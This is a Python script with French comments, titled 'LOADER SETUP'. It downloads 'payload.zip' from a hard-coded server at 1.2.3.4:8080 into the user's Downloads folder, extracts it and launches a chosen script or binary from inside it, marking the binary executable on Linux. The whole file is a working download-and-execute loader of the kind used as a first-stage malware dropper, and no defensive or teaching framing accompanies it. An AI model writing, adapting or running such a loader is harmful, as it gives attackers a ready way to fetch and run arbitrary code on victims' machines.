import requests
import os
import sys
import zipfile
import subprocess

SERVER_IP = "1.2.3.4"
SERVER_PORT = 8080
FILE_NAME = "payload.zip"
DOWNLOAD_URL = f"http://{SERVER_IP}:{SERVER_PORT}/{FILE_NAME}"
SAVE_PATH = os.path.join(os.path.expanduser("~"), "Downloads", FILE_NAME)
EXTRACT_PATH = os.path.join(os.path.expanduser("~"), "Downloads", "payload")

# ============================================================
# CONFIGURATION EXECUTION
# Modifie cette section pour changer ce qui sera exécuté
# après l'extraction du zip
#
# Exemples :
#   "mon_script.py"        -> script Python dans le dossier extrait
#   "mon_programme.exe"    -> exécutable Windows
#   "mon_binaire"          -> binaire Linux (sans extension)
#
EXEC_TARGET = "mon_script.py"  # <- change ici le nom du fichier à exécuter
#
# Type d'exécution :
#   "python"   -> lance avec python3 (cross-platform)
#   "direct"   -> lance directement le binaire (exe, elf...)
#
EXEC_TYPE = "python"  # <- change ici : "python" ou "direct"
# ============================================================


def download_file(url: str, save_path: str) -> bool:
    print(f"[*] Connexion au serveur : {SERVER_IP}:{SERVER_PORT}")
    print(f"[*] Téléchargement de : {FILE_NAME}")
    try:
        response = requests.get(url, stream=True, timeout=10)
        response.raise_for_status()
        total_size = int(response.headers.get("content-length", 0))
        downloaded = 0
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        with open(save_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
                    downloaded += len(chunk)
                    if total_size > 0:
                        percent = (downloaded / total_size) * 100
                        bar = int(percent / 2)
                        print(
                            f"\r[{'=' * bar}{' ' * (50 - bar)}] {percent:.1f}%",
                            end="",
                            flush=True,
                        )
        print(f"\n[+] Fichier sauvegardé : {save_path}")
        return True
    except requests.exceptions.ConnectionError:
        print(f"[-] Erreur : impossible de joindre le serveur {SERVER_IP}:{SERVER_PORT}")
    except requests.exceptions.Timeout:
        print("[-] Erreur : le serveur ne répond pas (timeout)")
    except requests.exceptions.HTTPError as e:
        print(f"[-] Erreur HTTP : {e}")
    except OSError as e:
        print(f"[-] Erreur fichier : {e}")
    return False


def extract_zip(save_path: str, extract_path: str) -> bool:
    print(f"[*] Extraction de : {os.path.basename(save_path)}")
    try:
        os.makedirs(extract_path, exist_ok=True)
        with zipfile.ZipFile(save_path, "r") as z:
            z.extractall(extract_path)
        print(f"[+] Extrait dans : {extract_path}")
        return True
    except zipfile.BadZipFile:
        print("[-] Erreur : le fichier téléchargé n'est pas un zip valide")
    except OSError as e:
        print(f"[-] Erreur extraction : {e}")
    return False


def execute_payload(extract_path: str) -> bool:
    # Chemin complet vers le fichier à exécuter
    target_path = os.path.join(extract_path, EXEC_TARGET)

    if not os.path.exists(target_path):
        print(f"[-] Erreur : fichier introuvable -> {target_path}")
        return False

    print(f"[*] Exécution de : {EXEC_TARGET}")
    try:
        # -- Mode Python : lance le fichier avec python3 --
        # Utile pour les scripts .py cross-platform
        if EXEC_TYPE == "python":
            subprocess.Popen(["python3", target_path])

        # -- Mode direct : lance le binaire directement --
        # Utile pour les .exe Windows ou binaires Linux
        elif EXEC_TYPE == "direct":
            # Sur Linux : s'assure que le binaire est exécutable
            if os.name != "nt":
                os.chmod(target_path, 0o755)
            subprocess.Popen([target_path])

        print(f"[+] Lancé avec succès.")
        return True

    except OSError as e:
        print(f"[-] Erreur exécution : {e}")
    return False


def main():
    print("=" * 50)
    print("         LOADER SETUP")
    print("=" * 50)

    success = download_file(DOWNLOAD_URL, SAVE_PATH)
    if not success:
        print("[-] Échec du téléchargement.")
        sys.exit(1)

    print("[+] Téléchargement terminé avec succès.")

    if FILE_NAME.endswith(".zip"):
        extracted = extract_zip(SAVE_PATH, EXTRACT_PATH)
        if not extracted:
            print("[-] Échec de l'extraction.")
            sys.exit(1)
        print("[+] Extraction terminée avec succès.")

        executed = execute_payload(EXTRACT_PATH)
        if not executed:
            print("[-] Échec de l'exécution.")
            sys.exit(1)

    sys.exit(0)


if __name__ == "__main__":
    main()
